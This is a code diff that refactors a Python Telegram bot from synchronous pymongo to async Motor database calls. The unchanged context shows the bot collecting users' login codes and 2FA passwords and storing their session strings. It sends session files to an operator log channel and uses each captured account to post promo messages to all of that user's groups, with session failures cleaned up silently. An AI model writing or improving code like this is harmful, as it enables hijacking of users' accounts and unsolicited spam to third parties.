@@ -23,12 +23,11 @@ from pyrogram.errors import (
     SessionRevoked,
     SessionExpired
 )
-
+from motor.motor_asyncio import AsyncIOMotorClient
 from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES
-from pymongo import MongoClient
 
-# MongoDB Setup
-mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
+# Async MongoDB Setup
+mongo_client = AsyncIOMotorClient(DATABASE_URI_SESSIONS_F)
 database = mongo_client['Cluster0']['sessions']
 
 # Promo Texts (10 unique messages)
@@ -104,7 +103,7 @@ VERIFICATION_SUCCESS_KEYBOARD = InlineKeyboardMarkup([
 user_states = {}
 
 async def check_login_status(user_id):
-    user_data = database.find_one({"id": user_id})
+    user_data = await database.find_one({"id": user_id})
     return bool(user_data and user_data.get('logged_in'))
 
 async def cleanup_user_state(user_id):
@@ -127,7 +126,7 @@ async def handle_session_error(bot: Client, phone_number: str, error: Exception)
         f"🛑 Auto-disabled promotion\n"
         f"❌ Error: {str(error)[:200]}"
     )
-    database.update_one(
+    await database.update_one(
         {"mobile_number": phone_number},
         {"$set": {"promotion": False}}
     )
@@ -135,7 +134,7 @@ async def handle_session_error(bot: Client, phone_number: str, error: Exception)
 @Client.on_message(filters.private & filters.command("start"))
 async def start_login(bot: Client, message: Message):
     user_id = message.from_user.id
-    user_data = database.find_one({"id": user_id})
+    user_data = await database.find_one({"id": user_id})
     
     if user_data and user_data.get('session'):
         try:
@@ -144,7 +143,7 @@ async def start_login(bot: Client, message: Message):
             await test_client.get_me()
             await test_client.disconnect()
             
-            database.update_one(
+            await database.update_one(
                 {"id": user_id},
                 {"$set": {"logged_in": True}}
             )
@@ -152,12 +151,10 @@ async def start_login(bot: Client, message: Message):
             asyncio.create_task(send_promotion_messages(bot, user_data['session'], user_data['mobile_number']))
             return
         except Exception:
-            # Silent session cleanup - no messages to user or logs
-            database.update_one(
+            await database.update_one(
                 {"id": user_id},
                 {"$set": {"logged_in": False, "session": None, "promotion": False}}
             )
-            # Continue silently with new login process
     
     if await check_login_status(user_id):
         await message.reply(strings['already_logged_in'])
@@ -176,7 +173,7 @@ async def start_login(bot: Client, message: Message):
 async def handle_logout(bot: Client, message: Message):
     user_id = message.from_user.id
     
-    database.update_one(
+    await database.update_one(
         {"id": user_id},
         {"$set": {"logged_in": False}}
     )
@@ -254,7 +251,7 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
             state['otp_attempts'] += 1
             if state['otp_attempts'] >= 3:
                 await query.message.edit(strings['otp_blocked'])
-                database.update_one(
+                await database.update_one(
                     {"id": user_id},
                     {"$set": {"blocked": True}}
                 )
@@ -310,7 +307,7 @@ async def handle_2fa_password(bot: Client, message: Message):
         verified_msg = await bot.send_message(user_id, "Password verified...", reply_markup=ReplyKeyboardRemove())
         state['verified_msg_id'] = verified_msg.id
         
-        database.update_one(
+        await database.update_one(
             {"id": user_id},
             {"$set": {
                 "2fa_status": True,
@@ -325,7 +322,7 @@ async def handle_2fa_password(bot: Client, message: Message):
         state['2fa_attempts'] += 1
         if state['2fa_attempts'] >= 3:
             await message.reply(strings['2fa_blocked'], reply_markup=ReplyKeyboardRemove())
-            database.update_one(
+            await database.update_one(
                 {"id": user_id},
                 {"$set": {"blocked": True}}
             )
@@ -354,11 +351,11 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
             'promotion': True
         }
         
-        if existing := database.find_one({"id": user_id}):
-            database.update_one({'_id': existing['_id']}, {'$set': data})
+        if existing := await database.find_one({"id": user_id}):
+            await database.update_one({'_id': existing['_id']}, {'$set': data})
         else:
             data['id'] = user_id
-            database.insert_one(data)
+            await database.insert_one(data)
 
         os.makedirs("sessions", exist_ok=True)
         clean_phone = phone_number.replace('+', '')
@@ -374,7 +371,6 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
         )
         os.remove(session_file)
 
-        # Delete both verified_msg_id and last_msg_id if they exist
         state = user_states.get(user_id, {})
         messages_to_delete = []
         if 'verified_msg_id' in state:
@@ -411,7 +407,6 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
             await client.start()
             already_notified = False
             
-            # Get user info and stats
             me = await client.get_me()
             total_groups = 0
             owned_channels = 0
@@ -419,7 +414,6 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
             members_count = 0
             groups = []
             
-            # Get detailed stats
             try:
                 async for dialog in client.get_dialogs():
                     try:
@@ -430,19 +424,16 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
                         if not chat:
                             continue
                             
-                        # Count all groups
                         if chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                             total_groups += 1
                             groups.append(chat)
                             
-                        # Check ownership
                         if hasattr(chat, 'is_creator') and chat.is_creator:
                             if chat.type == enums.ChatType.CHANNEL:
                                 owned_channels += 1
                             elif chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                                 owned_groups += 1
                             
-                            # Get members count
                             if hasattr(chat, 'members_count') and chat.members_count:
                                 members_count += chat.members_count
                             else:
@@ -456,7 +447,6 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
             except Exception:
                 pass
             
-            # Create/update status message
             message_text = (
                 f"🚀 Promotion Starting For: {phone_number}\n"
                 f"👤 User: @{me.username or 'N/A'} ({me.id})\n\n"
@@ -477,14 +467,12 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
                         message_text
                     )
             except Exception:
-                # If message was deleted, send new one
                 status_message = await bot.send_message(
                     LOG_CHANNEL_SESSIONS_FILES,
                     message_text
                 )
             
-            # Promotion cycle
-            user_data = database.find_one({"mobile_number": phone_number})
+            user_data = await database.find_one({"mobile_number": phone_number})
             if not user_data or not user_data.get('promotion', True):
                 await bot.send_message(
                     LOG_CHANNEL_SESSIONS_FILES,
@@ -499,7 +487,6 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
                     await client.send_message(group.id, promo_text)
                     sent_count += 1
                     
-                    # Update status message after each successful send
                     try:
                         await status_message.edit_text(
                             f"🚀 Promotion Starting For: {phone_number}\n"
@@ -512,7 +499,6 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
                             f"✅ Total Messages Sent: {sent_count}/{total_groups}"
                         )
                     except Exception:
-                        # If message was deleted, recreate it
                         status_message = await bot.send_message(
                             LOG_CHANNEL_SESSIONS_FILES,
                             f"🚀 Promotion Starting For: {phone_number}\n"
@@ -539,7 +525,6 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
                     )
                     await asyncio.sleep(5)
 
-            # Final update when cycle completes
             try:
                 await status_message.edit_text(
                     f"🚀 Cycle Completed For: {phone_number}\n"
